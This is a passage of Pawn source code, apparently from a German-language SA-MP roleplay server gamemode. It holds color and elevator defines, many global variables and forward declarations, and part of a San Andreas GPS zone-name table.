#define NAMECOLOR_Grove				0x004200AA
#define NAMECOLOR_Ballas			0x990099AA
#define NAMECOLOR_FAF				0xCC0000AA
#define NAMECOLOR_Aztecas				0x00FFFFFF

#define COLOR_FORSELL               0x23A400FF
#define COLOR_BUYED                 0xFFFFFFAA // Geändert alte farbe 0xA60A00FF
//Motorradhelm
#define SLOT 1
//======= Bestimmungen ========//
#define MAX_BLITZER 15 // Maximale Anzahl von Blitzern
#define BLITZER_TIMER_INTERVALL 500 // Intervall für das Blitzen (in Milliesekunden)
#define BLITZER_PAUSE 1 // Anzahl der Minuten, in denen der Spieler nicht mehr geblitzt werden kann
#define SLOTS 1000
//#define foxBanFile "FoxBan/%s.ini"
#define dcmd(%1,%2,%3) if ((strcmp((%3)[1], #%1, true, (%2)) == 0) && ((((%3)[(%2) + 1] == 0) && (dcmd_%1(playerid, "")))||(((%3)[(%2) + 1] == 32) && (dcmd_%1(playerid, (%3)[(%2) + 2]))))) return 1
#define ELEVATOR_SPEED      (5.0)
#define DOORS_SPEED         (4.0)
#define ELEVATOR_WAIT_TIME  (5000)
#define X_DOOR_CLOSED       (1786.627685)
#define X_DOOR_R_OPENED     (1785.027685)
#define X_DOOR_L_OPENED     (1788.227685)
#define GROUND_Z_COORD      (14.511476)
#define ELEVATOR_OFFSET     (0.059523)
#define FarmerCheckpoints 47
#define EndFarmerCP 46
#define FFahrzeuge 6
#define INVALID_FARMER_CP -1
//#define TIME_to_HIDE 8000
#define MAX_NAGELBAENDER 15 // Maximale Anzahl von Nagelbaendern

#define DIALOG_ID           (874)
new ALLSTRING[180];


#define DIALOG_FlugLS 7432
#define DIALOG_FlugSF 7523
#define DIALOG_FlugLV 7434

//======= FARBEN ========//
#define F_G 0x24D900F6 //helles Grün
#define F_O 0xF6B400F6 //Neues Orange
#define blau 0x0085C4F6
#define NB 0x005B9BF6 // Neues Blau
#define NY 0xF5DEB3AA // Neues Gelb
#define RED_NEW 0xF60000F6
#define BLUE_NEW 0x0000CAF6
#define GREEN 0x21DD00FF
#define ORANGE 0xF97804FF
#define ROT 0xE60000FF
#define GRUEN 0x05FF00FF
#define GELB 0xFFFF00FF
#define BLAU 0x000FFFFF
#define RED 0xE60000FF
#define CHECKPOINT_NONE 0
#define CHECKPOINT_HOME 12
#define COLOR_GOLD 0xB8860BAA
#define COLOR_GRAD1 0xB4B5B7FF
#define COLOR_GRAD2 0xBFC0C2FF
#define COLOR_GRAD3 0xCBCCCEFF
#define COLOR_GRAD4 0xD8D8D8FF
#define COLOR_GRAD5 0xE3E3E3FF
#define COLOR_GRAD6 0xF0F0F0FF
#define COLOR_ORANGE 0xFF9933FF
#define COLOR_NTRL 0xC30C15F0
#define COLOR_BROWN 0x330000FF
#define COLOR_BLACK 0x000000FF
#define COLOR_GREY 0xAFAFAFAA
#define COLOR_GREEN 0x33AA33AA
#define COLOR_RED 0xAA3333AA
#define EVENTCOLOR 0xAA3333AA
#define COLOR_LIGHTRED 0xFF6347AA
#define COLOR_LIGHTBLUE 0x33CCFFAA
#define COLOR_LIGHTGREEN 0x9ACD32AA
#define COLOR_YELLOW 0xFFFF00AA
#define COLOR_YELLOW2 0xF5DEB3AA
#define COLOR_WHITE 0xFFFFFFAA
#define COLOR_WHITEE 0xFFFFFFAA
#define COLOR_FADE1 0xE6E6E6E6
#define COLOR_FADE2 0xC8C8C8C8
#define COLOR_FADE3 0xAAAAAAAA
#define COLOR_FADE4 0x8C8C8C8C
#define COLOR_FADE5 0x6E6E6E6E
#define COLOR_PURPLE 0xC2A2DAAA
#define COLOR_DBLUE 0x2641FEAA
#define COLOR_ALLDEPT 0xFF8282AA
#define COLOR_NEWS 0xFFA500AA
#define COLOR_OOC 0xE0FFFFAA
#define COLOR_AONDONNN 0xF5DEB3AA
#define TEAM_CYAN 1
#define TEAM_BLUE 2
#define TEAM_GREEN 3
#define TEAM_ORANGE 4
#define TEAM_COR 5
#define TEAM_BAR 6
#define TEAM_TAT 7
#define TEAM_CUN 8
#define TEAM_STR 9
#define TEAM_HIT 10
#define TEAM_ADMIN 17
#define OBJECTIVE_COLOR 0x64000064
#define TEAM_GREEN_COLOR 0xFFFFFFAA
#define TEAM_JOB_COLOR 0xFFB6C1AA
#define TEAM_HIT_COLOR 0xFFFFFF00
#define TEAM_BLUE_COLOR 0x8D8DFF00
#define COLOR_ADD 0x63FF60AA
#define TEAM_Grove_COLOR 0x00D900C8
#define TEAM_Vagos_COLOR 0xFFC801C8
#define TEAM_Ballas_COLOR 0xD900D3C8
#define TEAM_Aztecas_COLOR 0x01FCFFC8
#define TEAM_CYAN_COLOR 0xFF8282AA
#define TEAM_ORANGE_COLOR 0xFF830000
#define TEAM_COR_COLOR 0x39393900
#define TEAM_BAR_COLOR 0x00D90000
#define TEAM_TAT_COLOR 0xBDCB9200
#define TEAM_CUN_COLOR 0xD900D300
#define TEAM_STR_COLOR 0x01FCFF00
#define TEAM_ADMIN_COLOR 0x00808000
#define COLOR_INVIS 0xAFAFAF00
#define COLOR_SPEC 0xBFC0C200





















#define ADIALOG_ID           (5646)


#define Y_DOOR_CLOSED       (-1180.535917)
#define Y_DOOR_R_OPENED     Y_DOOR_CLOSED - 1.6
#define Y_DOOR_L_OPENED     Y_DOOR_CLOSED + 1.6

#define AGROUND_Z_COORD      (20.879316)

#define AELEVATOR_OFFSET     (0.059523)

#define AX_ELEVATOR_POS      (1181.622924)
#define AY_ELEVATOR_POS      (-1180.554687)

// Elevator state defines
#define ELEVATOR_STATE_IDLE     (0)
#define ELEVATOR_STATE_WAITING  (1)
#define ELEVATOR_STATE_MOVING   (2)

// Invalid floor define
#define INVALID_FLOOR           (-1)

// Used for chat text messages
#define COLOR_MESSAGE_YELLOW        0xFFDD00AA

// -----------------------------------------------------------------------------
// Constants
// ---------

// Elevator floor names for the 3D text labels
static AFloorNames[11][] =
{
	"Car Park",
	"Ground Floor",
	"First Floor",
	"Second Floor",
	"Third Floor",
	"Fourth Floor",
	"Fifth Floor",
	"Sixth Floor",
	"Seventh Floor",
	"Eighth Floor",
	"Ninth Floor"
};

// Elevator floor Z heights
static Float:AFloorZOffsets[11] =
{
    0.0, 		// Car Park
    13.604544,	// Ground Floor
    18.808519,	// First Floor = 13.604544 + 5.203975
    24.012494,  // Second Floor = 18.808519 + 5.203975
    29.216469,  // Third Floor = 24.012494 + 5.203975
    34.420444,  // Fourth Floor = 29.216469 + 5.203975
    39.624419,  // Fifth Floor = 34.420444 + 5.203975
    44.828394,  // Sixth Floor = 39.624419 + 5.203975
    50.032369,  // Seventh Floor = 44.828394 + 5.203975
    55.236344,  // Eighth Floor = 50.032369 + 5.203975
    60.440319   // Ninth Floor = 55.236344 + 5.203975
};


new LSApartments1Object;


new LSApartments1CPObject;


new AObj_Elevator, AObj_ElevatorDoors[2], AObj_FloorDoors[11][2];


new Text3D:ALabel_Elevator, Text3D:ALabel_Floors[11];


new AElevatorState;


new	AElevatorFloor;


new AElevatorQueue[11];


new	AFloorRequestedBy[11];


new AElevatorBoostTimer;

// ------------------------------------------------------------------------------
// Function Forwards
// -----------------

// Public:
forward ACallElevator(playerid, floorid);    // You can use INVALID_PLAYER_ID too.
forward AShowElevatorDialog(playerid);

// Private:
forward AElevator_Initialize();
forward AElevator_Destroy();

forward AElevator_OpenDoors();
forward AElevator_CloseDoors();
forward AFloor_OpenDoors(floorid);
forward AFloor_CloseDoors(floorid);

forward AElevator_MoveToFloor(floorid);
forward AElevator_Boost(floorid);        	// Increases the elevator speed until it reaches 'floorid'.
forward AElevator_TurnToIdle();

forward AReadNextFloorInQueue();
forward ARemoveFirstQueueFloor();
forward AAddFloorToQueue(floorid);
forward AIsFloorInQueue(floorid);
forward AResetAElevatorQueue();

forward ADidPlayerRequestElevator(playerid);

forward Float:AGetElevatorZCoordForFloor(floorid);
forward Float:AGetDoorsZCoordForFloor(floorid);












//new zolltor;
new zolltor1;
new zolltor2;
new zolltor3;
new zolltor4;
new zolltor5;
new zolltor6;
new zolltor7;
new zolltor8;
new zolltor9;
new zolltor10;
new zolltor11;
new zolltor12;
new zolltor13;
new zolltor14;
new zolltor15;
new zolltor16;
new zolltor17;
new zolltor18;
new zolltor19;
new zollvar[20];


//new PlayerHacked[MAX_PLAYERS];
//new JustService[MAX_PLAYERS];
//new SpeedoON[MAX_PLAYERS];
new Float:sVehicle_X[MAX_VEHICLES], Float:sVehicle_Y[MAX_VEHICLES], Float:sVehicle_Z[MAX_VEHICLES];
//================//

new TicketZeile[MAX_PLAYERS]; // Wieviele Zeilen schon belegt sind.
new SupportTicket[MAX_PLAYERS]; // Ob der Spieler ein Ticket hat
new TicketAngenommen[MAX_PLAYERS]; // Ob das Ticket angenommen wurde!
new DeinSupport[MAX_PLAYERS]; // Der Supporter, der dein Ticket angenommen hat!
new NewbRoller[MAX_PLAYERS];

//Report System
new JustReported[MAX_PLAYERS];
new PlayerNeedsHelp[MAX_PLAYERS];
new Weapons[MAX_PLAYERS][11], Ammo[MAX_PLAYERS][11];

//new Text:Forum;
new rtor1;
new rtor2;

new d1;
new d2;
new d3;
new d4;

new fbisirene[MAX_VEHICLES];
new fbisirene1[MAX_VEHICLES];
new fbisirene2[MAX_VEHICLES];
//new bool:Allowswat;
new yaktor;
new yaktor2;
//new car_BulletLS;
//new car_Busbot1;
new Spieler;
//TowTruckers
new TowTruckers = 0;
new IsTowTrucker[MAX_PLAYERS];
//TowTruckers

// NAVI
new Navi[MAX_PLAYERS];
new BlindFold[MAX_PLAYERS];
//new Noobi[MAX_PLAYERS];
new Text3D:Supporter[MAX_PLAYERS];
new Text3D:Mod[MAX_PLAYERS];
new Text3D:Supermod[MAX_PLAYERS];
new Text3D:Admin[MAX_PLAYERS];
new lcntor;
new MVTor17;
new pdd1;
new pdd2;
new bwtor1;
new bwtor2;
new htor;
new haustor;
new rtor;
new rtorvar;
new Text:NDMZONET;
new AtClothes[MAX_PLAYERS];
new UnderCoverCar_Sultan;
new FirstSpawn[MAX_PLAYERS];
new pCaller[MAX_PLAYERS];
new pVerbrecher[MAX_PLAYERS];
new pIP[MAX_PLAYERS][16];
new TazerBereit[MAX_PLAYERS];
new WeapsTaken[MAX_PLAYERS];
new FraktionsKasse[24];
new HafenKlause[14];
new robls;
new robsf;
new roblv;
new RMBus;
new Eingeladen[MAX_PLAYERS];
new EingeladenORG[MAX_PLAYERS];



new TextSpams[MAX_PLAYERS];
new CMDSpams[MAX_PLAYERS];
//new HitmanLeaderBullet;
//new knastdm[MAX_PLAYERS];

// .:Cars:.
new Zug[5];
new KartFahrzeug[10];//
new MuellFahrzeug[10];//
new PilotenVehs[30];//
new Truck[7];//
new BMXEN[30];//
new BusVehs[30];
new TaxiVehs[12];

//.: Personalausweis :.
new AllowPerso[MAX_PLAYERS];

new LottoTimer = 0;
new StuntVar[MAX_PLAYERS];
new AfterTutorial[MAX_PLAYERS];
new Mullabfuhr[MAX_PLAYERS];
new MullabfuhrCP[MAX_PLAYERS];
new Text:Datum;
new Text:Uhrzeit;
new Text:Copyright;
new ShowMeAllowed = 0;//aus

new need[MAX_PLAYERS];
//new Bombactivated;/*
new bombexplotimer;
new bombzone;

new CMDspam[MAX_PLAYERS];
//new BombStatus;
new Sperrebit[MAX_PLAYERS];
new sSperre[MAX_PLAYERS][5];

/*
#define MAX_BOMBS 120

new bombe[MAX_BOMBS];
new bombdraht1 = 0;//rot
new bombdraht2 = 0;//gelb
new bombdraht3 = 0;//grün
new bombdraht4 = 0;//blau
new bombdrahtchoosen = 0;//gelegt 0 = nein
new SelfStatus;
new bombtimer;
*/

/*
new Float:PlayerExplosionX[MAX_PLAYERS] = 0.0;
new Float:PlayerExplosionY[MAX_PLAYERS] = 0.0;
new Float:PlayerExplosionZ[MAX_PLAYERS] = 0.0;*/
new ZivilSkin[MAX_PLAYERS];
new PruefungsTimer[MAX_PLAYERS];
new PruefungsSchritt[MAX_PLAYERS];
new MotorradTimer[MAX_PLAYERS];
new MotorradSchritt[MAX_PLAYERS];

new IsBlacklist[MAX_PLAYERS]; // Blacklist

new Float:EventPos[3];
new bool:EventAktiv = false;

new Menu:BOMB;
new Menu:BOMBD;
new Menu:FIREequip;
new LVPDtorneu;

new WantLawyer[MAX_PLAYERS];
new CallLawyer[MAX_PLAYERS];
new ApprovedLawyer[MAX_PLAYERS];

new Menu:BSMK;
new Menu:PMK;
new Menu:CBKM;
new Menu:PruefungMenu;
new Menu:MotorradMenu;
//new Menu:Navigation;



new KLEIDUNG_PRO;
new KLEIDUNG_ZIP;

//======OLICHT=========//
new Olicht[MAX_VEHICLES];
new light1[MAX_VEHICLES];
new light2[MAX_VEHICLES];
new light3[MAX_VEHICLES];
new light4[MAX_VEHICLES];
new light5[MAX_VEHICLES];




forward SendJobMessage(job, color, string[]);

//==== BLITZER ====//
enum eBlitzer
{
	ID, Float:BlitzerX, Float:BlitzerY, Float:BlitzerZ, Radius, Geschwindigkeit, Erstellt, Strafe
};

new Blitzer[MAX_BLITZER][eBlitzer];
new GesammtBlitzer;
new BlitzerErstellt[MAX_PLAYERS];
//=== NAGELBAND ======//
enum eNagelBand {
	ID, Float:NagelBandX, Float:NagelBandY, Float:NagelBandZ, nErstellt
};
new NagelBand[MAX_NAGELBAENDER][eNagelBand];
new NagelBandErstellt[MAX_PLAYERS];
/*
//==== SPEEDO ====//
enum OldSpeedoPos
{
	Float:sX,
	Float:sY,
	Float:sZ
}
new SavePlayerPos[MAX_PLAYERS][OldSpeedoPos];
*/
static FloorNames[21][] =
{
	"Erdgeschoss",
	"Erster Stockwerk",
	"Zweiter Stockwerk",
	"Dritter Stockwerk",
	"Vierter Stockwerk",
	"Fünfter Stockwerk",
	"Sechster Stockwerk",
	"Siebter Stockwerk",
	"Achter Stockwerk",
	"Neunter Stockwerk",
	"Zehnter Stockwerk",
	"Elfter Stockwerk",
	"Zwölfter Stockwerk",
	"Dreizehnter Stockwerk",
	"Fierzehnter Stockwerk",
	"Fünftzehnter Stockwerk",
	"Sechszehnter Stockwerk",
	"Siebzehnter Stockwerk",
	"Achtzehnter Stockwerk",
	"Neunzehnter Stockwerk",
	"Penthouse"
};

static Float:FloorZOffsets[21] =
{
    0.0,		// 0.0,
    8.5479,		// 8.5479,
    13.99945,   // 8.5479 + (5.45155 * 1.0),
    19.45100,   // 8.5479 + (5.45155 * 2.0),
    24.90255,   // 8.5479 + (5.45155 * 3.0),
    30.35410,   // 8.5479 + (5.45155 * 4.0),
    35.80565,   // 8.5479 + (5.45155 * 5.0),
    41.25720,   // 8.5479 + (5.45155 * 6.0),
    46.70875,   // 8.5479 + (5.45155 * 7.0),
    52.16030,   // 8.5479 + (5.45155 * 8.0),
    57.61185,   // 8.5479 + (5.45155 * 9.0),
    63.06340,   // 8.5479 + (5.45155 * 10.0),
    68.51495,   // 8.5479 + (5.45155 * 11.0),
    73.96650,   // 8.5479 + (5.45155 * 12.0),
    79.41805,   // 8.5479 + (5.45155 * 13.0),
    84.86960,   // 8.5479 + (5.45155 * 14.0),
    90.32115,   // 8.5479 + (5.45155 * 15.0),
    95.77270,   // 8.5479 + (5.45155 * 16.0),
    101.22425,  // 8.5479 + (5.45155 * 17.0),
    106.67580,	// 8.5479 + (5.45155 * 18.0),
    112.12735	// 8.5479 + (5.45155 * 19.0)
};

new Obj_Elevator, Obj_ElevatorDoors[2],Obj_FloorDoors[21][2];
new Text3D:Label_Elevator, Text3D:Label_Floors[21];
#define ELEVATOR_STATE_IDLE     (0)
#define ELEVATOR_STATE_WAITING  (1)
#define ELEVATOR_STATE_MOVING   (2)
new ElevatorState, ElevatorFloor;
#define INVALID_FLOOR           (-1)
new ElevatorQueue[21], FloorRequestedBy[21];
new ElevatorBoostTimer;
forward CallElevator(playerid, floorid);    // You can use INVALID_PLAYER_ID too.
forward ShowElevatorDialog(playerid);
forward GetPlayerAdmin(playerid);
forward GetPlayerLeader(playerid);
forward GetPlayerMember(playerid);
forward Elevator_Initialize();
forward Elevator_Destroy();
forward Elevator_OpenDoors();
forward Elevator_CloseDoors();
forward Floor_OpenDoors(floorid);
forward Floor_CloseDoors(floorid);
forward Elevator_MoveToFloor(floorid);
forward Elevator_Boost(floorid);        	// Increases the elevator speed until it reaches 'floorid'.
forward Elevator_TurnToIdle();
forward ReadNextFloorInQueue();
forward RemoveFirstQueueFloor();
forward AddFloorToQueue(floorid);
forward IsFloorInQueue(floorid);
forward ResetElevatorQueue();
forward ClearBlack(playerid);
forward LoadBlacklist();
forward GetPlayerMafia(playerid);
forward DidPlayerRequestElevator(playerid);
forward Float:GetElevatorZCoordForFloor(floorid);
forward Float:GetDoorsZCoordForFloor(floorid);
forward AnwaltErlaubnisWeg(playerid);
forward AnwaltErlaubnis(playerid);
//forward LoadFactionCars();
forward SaveFactionCars(bool:destroy);
//forward LockFactionCarDoors();
forward DestroyAndCreateFactionCar(fc);
forward hack(playerid);
forward hackabbruch(playerid);

//Schutzgeld
forward CheckLCNSchutz(i);
forward CheckYAKSchutz(i);
forward CheckGROSchutz(i);
forward CheckSCARSchutz(i);
forward KickPlayerAfterTime(playerid);



enum MainZone
{
	Zone_Name[28],
	Float:Zone_Area[6]
};

static const SA_GPS_ZONE_NAMES[][MainZone] = {

	{"The Big Ear",	                {-410.00,1403.30,-3.00,-137.90,1681.20,200.00}},
	{"Aldea Malvada",               {-1372.10,2498.50,0.00,-1277.50,2615.30,200.00}},
	{"Angel Pine",                  {-2324.90,-2584.20,-6.10,-1964.20,-2212.10,200.00}},
	{"Arco del Oeste",              {-901.10,2221.80,0.00,-592.00,2571.90,200.00}},
	{"Avispa Country Club",         {-2646.40,-355.40,0.00,-2270.00,-222.50,200.00}},
	{"Avispa Country Club",         {-2831.80,-430.20,-6.10,-2646.40,-222.50,200.00}},
	{"Avispa Country Club",         {-2361.50,-417.10,0.00,-2270.00,-355.40,200.00}},
	{"Avispa Country Club",         {-2667.80,-302.10,-28.80,-2646.40,-262.30,71.10}},
	{"Avispa Country Club",         {-2470.00,-355.40,0.00,-2270.00,-318.40,46.10}},
	{"Avispa Country Club",         {-2550.00,-355.40,0.00,-2470.00,-318.40,39.70}},
	{"Back o Beyond",               {-1166.90,-2641.10,0.00,-321.70,-1856.00,200.00}},
	{"Battery Point",               {-2741.00,1268.40,-4.50,-2533.00,1490.40,200.00}},
	{"Bayside",                     {-2741.00,2175.10,0.00,-2353.10,2722.70,200.00}},
	{"Bayside Marina",              {-2353.10,2275.70,0.00,-2153.10,2475.70,200.00}},
	{"Beacon Hill",                 {-399.60,-1075.50,-1.40,-319.00,-977.50,198.50}},
	{"Blackfield",                  {964.30,1203.20,-89.00,1197.30,1403.20,110.90}},
	{"Blackfield",                  {964.30,1403.20,-89.00,1197.30,1726.20,110.90}},
	{"Blackfield Chapel",           {1375.60,596.30,-89.00,1558.00,823.20,110.90}},
	{"Blackfield Chapel",           {1325.60,596.30,-89.00,1375.60,795.00,110.90}},
	{"Blackfield",     				{1197.30,1044.60,-89.00,1277.00,1163.30,110.90}},
	{"Blackfield",     				{1166.50,795.00,-89.00,1375.60,1044.60,110.90}},
	{"Blackfield",     				{1277.00,1044.60,-89.00,1315.30,1087.60,110.90}},
	{"Blackfield",     				{1375.60,823.20,-89.00,1457.30,919.40,110.90}},
	{"Blueberry",                   {104.50,-220.10,2.30,349.60,152.20,200.00}},
	{"Blueberry",                   {19.60,-404.10,3.80,349.60,-220.10,200.00}},
	{"Blueberry Acres",             {-319.60,-220.10,0.00,104.50,293.30,200.00}},
	{"Caligula's Palace",           {2087.30,1543.20,-89.00,2437.30,1703.20,110.90}},
	{"Caligula's Palace",           {2137.40,1703.20,-89.00,2437.30,1783.20,110.90}},
	{"Calton Heights",              {-2274.10,744.10,-6.10,-1982.30,1358.90,200.00}},
	{"Chinatown",                   {-2274.10,578.30,-7.60,-2078.60,744.10,200.00}},
	{"City Hall",                   {-2867.80,277.40,-9.10,-2593.40,458.40,200.00}},
	{"Come-A-Lot",                  {2087.30,943.20,-89.00,2623.10,1203.20,110.90}},
	{"Commerce",                    {1323.90,-1842.20,-89.00,1701.90,-1722.20,110.90}},
	{"Commerce",                    {1323.90,-1722.20,-89.00,1440.90,-1577.50,110.90}},
	{"Commerce",                    {1370.80,-1577.50,-89.00,1463.90,-1384.90,110.90}},
	{"Commerce",                    {1463.90,-1577.50,-89.00,1667.90,-1430.80,110.90}},
	{"Commerce",                    {1583.50,-1722.20,-89.00,1758.90,-1577.50,110.90}},
	{"Commerce",                    {1667.90,-1577.50,-89.00,1812.60,-1430.80,110.90}},
	{"Conference Center",           {1046.10,-1804.20,-89.00,1323.90,-1722.20,110.90}},
	{"Conference Center",           {1073.20,-1842.20,-89.00,1323.90,-1804.20,110.90}},
	{"Cranberry Station",           {-2007.80,56.30,0.00,-1922.00,224.70,100.00}},
	{"Creek",                       {2749.90,1937.20,-89.00,2921.60,2669.70,110.90}},
	{"Dillimore",                   {580.70,-674.80,-9.50,861.00,-404.70,200.00}},
	{"Doherty",                     {-2270.00,-324.10,-0.00,-1794.90,-222.50,200.00}},
	{"Doherty",                     {-2173.00,-222.50,-0.00,-1794.90,265.20,200.00}},
	{"Downtown",                    {-1982.30,744.10,-6.10,-1871.70,1274.20,200.00}},
	{"Downtown",                    {-1871.70,1176.40,-4.50,-1620.30,1274.20,200.00}},
	{"Downtown",                    {-1700.00,744.20,-6.10,-1580.00,1176.50,200.00}},
	{"Downtown",                    {-1580.00,744.20,-6.10,-1499.80,1025.90,200.00}},
	{"Downtown",                    {-2078.60,578.30,-7.60,-1499.80,744.20,200.00}},
	{"Downtown",                    {-1993.20,265.20,-9.10,-1794.90,578.30,200.00}},
	{"Downtown LS",         		{1463.90,-1430.80,-89.00,1724.70,-1290.80,110.90}},
	{"Downtown LS",         		{1724.70,-1430.80,-89.00,1812.60,-1250.90,110.90}},
	{"Downtown LS",         		{1463.90,-1290.80,-89.00,1724.70,-1150.80,110.90}},
	{"Downtown LS",         		{1370.80,-1384.90,-89.00,1463.90,-1170.80,110.90}},
	{"Downtown LS",         		{1724.70,-1250.90,-89.00,1812.60,-1150.80,110.90}},
	{"Downtown LS",         		{1370.80,-1170.80,-89.00,1463.90,-1130.80,110.90}},
	{"Downtown LS",         		{1378.30,-1130.80,-89.00,1463.90,-1026.30,110.90}},
	{"Downtown LS",         		{1391.00,-1026.30,-89.00,1463.90,-926.90,110.90}},
	{"Downtown LS",         		{1507.50,-1385.20,110.90,1582.50,-1325.30,335.90}},
	{"East Beach",                  {2632.80,-1852.80,-89.00,2959.30,-1668.10,110.90}},
	{"East Beach",                  {2632.80,-1668.10,-89.00,2747.70,-1393.40,110.90}},
	{"East Beach",                  {2747.70,-1668.10,-89.00,2959.30,-1498.60,110.90}},
	{"East Beach",                  {2747.70,-1498.60,-89.00,2959.30,-1120.00,110.90}},
	{"East Los Santos",             {2421.00,-1628.50,-89.00,2632.80,-1454.30,110.90}},
	{"East Los Santos",             {2222.50,-1628.50,-89.00,2421.00,-1494.00,110.90}},
	{"East Los Santos",             {2266.20,-1494.00,-89.00,2381.60,-1372.00,110.90}},
	{"East Los Santos",             {2381.60,-1494.00,-89.00,2421.00,-1454.30,110.90}},
	{"East Los Santos",             {2281.40,-1372.00,-89.00,2381.60,-1135.00,110.90}},
	{"East Los Santos",             {2381.60,-1454.30,-89.00,2462.10,-1135.00,110.90}},
	{"East Los Santos",             {2462.10,-1454.30,-89.00,2581.70,-1135.00,110.90}},
	{"Easter Basin",                {-1794.90,249.90,-9.10,-1242.90,578.30,200.00}},
	{"Easter Basin",                {-1794.90,-50.00,-0.00,-1499.80,249.90,200.00}},
	{"Easter Bay AP",          		{-1499.80,-50.00,-0.00,-1242.90,249.90,200.00}},
	{"Easter Bay AP",          		{-1794.90,-730.10,-3.00,-1213.90,-50.00,200.00}},
	{"Easter Bay AP",          		{-1213.90,-730.10,0.00,-1132.80,-50.00,200.00}},
	{"Easter Bay AP",          		{-1242.90,-50.00,0.00,-1213.90,578.30,200.00}},
	{"Easter Bay AP",          		{-1213.90,-50.00,-4.50,-947.90,578.30,200.00}},
	{"Easter Bay AP",          		{-1315.40,-405.30,15.40,-1264.40,-209.50,25.40}},
	{"Easter Bay AP",          		{-1354.30,-287.30,15.40,-1315.40,-209.50,25.40}},
	{"Easter Bay AP",          		{-1490.30,-209.50,15.40,-1264.40,-148.30,25.40}},
	{"Easter Bay Chemicals",        {-1132.80,-768.00,0.00,-956.40,-578.10,200.00}},
	{"Easter Bay Chemicals",        {-1132.80,-787.30,0.00,-956.40,-768.00,200.00}},
	{"Castillo del Diablo",      	{-464.50,2217.60,0.00,-208.50,2580.30,200.00}},
	{"Castillo del Diablo",      	{-208.50,2123.00,-7.60,114.00,2337.10,200.00}},
	{"Castillo del Diablo",      	{-208.50,2337.10,0.00,8.40,2487.10,200.00}},
	{"El Corona",                   {1812.60,-2179.20,-89.00,1970.60,-1852.80,110.90}},
	{"El Corona",                   {1692.60,-2179.20,-89.00,1812.60,-1842.20,110.90}},
	{"El Quebrados",                {-1645.20,2498.50,0.00,-1372.10,2777.80,200.00}},
	{"Esplanade East",              {-1620.30,1176.50,-4.50,-1580.00,1274.20,200.00}},
	{"Esplanade East",              {-1580.00,1025.90,-6.10,-1499.80,1274.20,200.00}},
	{"Esplanade East",              {-1499.80,578.30,-79.60,-1339.80,1274.20,20.30}},
	{"Esplanade North",             {-2533.00,1358.90,-4.50,-1996.60,1501.20,200.00}},
	{"Esplanade North",             {-1996.60,1358.90,-4.50,-1524.20,1592.50,200.00}},
	{"Esplanade North",             {-1982.30,1274.20,-4.50,-1524.20,1358.90,200.00}},
	{"Fallen Tree",                 {-792.20,-698.50,-5.30,-452.40,-380.00,200.00}},
	{"Fallow Bridge",               {434.30,366.50,0.00,603.00,555.60,200.00}},
	{"Fern Ridge",                  {508.10,-139.20,0.00,1306.60,119.50,200.00}},
	{"Financial",                   {-1871.70,744.10,-6.10,-1701.30,1176.40,300.00}},
	{"Fisher's Lagoon",             {1916.90,-233.30,-100.00,2131.70,13.80,200.00}},
	{"Flint Intersection",          {-187.70,-1596.70,-89.00,17.00,-1276.60,110.90}},
	{"Flint Range",                 {-594.10,-1648.50,0.00,-187.70,-1276.60,200.00}},
	{"Fort Carson",                 {-376.20,826.30,-3.00,123.70,1220.40,200.00}},
	{"Foster Valley",               {-2270.00,-430.20,-0.00,-2178.60,-324.10,200.00}},
	{"Foster Valley",               {-2178.60,-599.80,-0.00,-1794.90,-324.10,200.00}},
	{"Foster Valley",               {-2178.60,-1115.50,0.00,-1794.90,-599.80,200.00}},
	{"Foster Valley",               {-2178.60,-1250.90,0.00,-1794.90,-1115.50,200.00}},
	{"Frederick Bridge",            {2759.20,296.50,0.00,2774.20,594.70,200.00}},
	{"Gant Bridge",                 {-2741.40,1659.60,-6.10,-2616.40,2175.10,200.00}},
	{"Gant Bridge",                 {-2741.00,1490.40,-6.10,-2616.40,1659.60,200.00}},
	{"Ganton",                      {2222.50,-1852.80,-89.00,2632.80,-1722.30,110.90}},
	{"Ganton",                      {2222.50,-1722.30,-89.00,2632.80,-1628.50,110.90}},
	{"Garcia",                      {-2411.20,-222.50,-0.00,-2173.00,265.20,200.00}},
	{"Garcia",                      {-2395.10,-222.50,-5.30,-2354.00,-204.70,200.00}},
	{"Garver Bridge",               {-1339.80,828.10,-89.00,-1213.90,1057.00,110.90}},
	{"Garver Bridge",               {-1213.90,950.00,-89.00,-1087.90,1178.90,110.90}},
	{"Garver Bridge",               {-1499.80,696.40,-179.60,-1339.80,925.30,20.30}},
	{"Glen Park",                   {1812.60,-1449.60,-89.00,1996.90,-1350.70,110.90}},
	{"Glen Park",                   {1812.60,-1100.80,-89.00,1994.30,-973.30,110.90}},
	{"Glen Park",                   {1812.60,-1350.70,-89.00,2056.80,-1100.80,110.90}},
	{"Green Palms",                 {176.50,1305.40,-3.00,338.60,1520.70,200.00}},
	{"Greenglass College",          {964.30,1044.60,-89.00,1197.30,1203.20,110.90}},
	{"Greenglass College",          {964.30,930.80,-89.00,1166.50,1044.60,110.90}},
	{"Hampton Barns",               {603.00,264.30,0.00,761.90,366.50,200.00}},
	{"Hankypanky Point",            {2576.90,62.10,0.00,2759.20,385.50,200.00}},
	{"Harry Gold Parkway",          {1777.30,863.20,-89.00,1817.30,2342.80,110.90}},
	{"Hashbury",                    {-2593.40,-222.50,-0.00,-2411.20,54.70,200.00}},
	{"Hilltop Farm",                {967.30,-450.30,-3.00,1176.70,-217.90,200.00}},
	{"Hunter Quarry",               {337.20,710.80,-115.20,860.50,1031.70,203.70}},
	{"Idlewood",                    {1812.60,-1852.80,-89.00,1971.60,-1742.30,110.90}},
	{"Idlewood",                    {1812.60,-1742.30,-89.00,1951.60,-1602.30,110.90}},
	{"Idlewood",                    {1951.60,-1742.30,-89.00,2124.60,-1602.30,110.90}},
	{"Idlewood",                    {1812.60,-1602.30,-89.00,2124.60,-1449.60,110.90}},
	{"Idlewood",                    {2124.60,-1742.30,-89.00,2222.50,-1494.00,110.90}},
	{"Idlewood",                    {1971.60,-1852.80,-89.00,2222.50,-1742.30,110.90}},
	{"Jefferson",                   {1996.90,-1449.60,-89.00,2056.80,-1350.70,110.90}},
	{"Jefferson",                   {2124.60,-1494.00,-89.00,2266.20,-1449.60,110.90}},
	{"Jefferson",                   {2056.80,-1372.00,-89.00,2281.40,-1210.70,110.90}},
	{"Jefferson",                   {2056.80,-1210.70,-89.00,2185.30,-1126.30,110.90}},
	{"Jefferson",                   {2185.30,-1210.70,-89.00,2281.40,-1154.50,110.90}},
	{"Jefferson",                   {2056.80,-1449.60,-89.00,2266.20,-1372.00,110.90}},
	{"Julius Thruway",         		{2623.10,943.20,-89.00,2749.90,1055.90,110.90}},
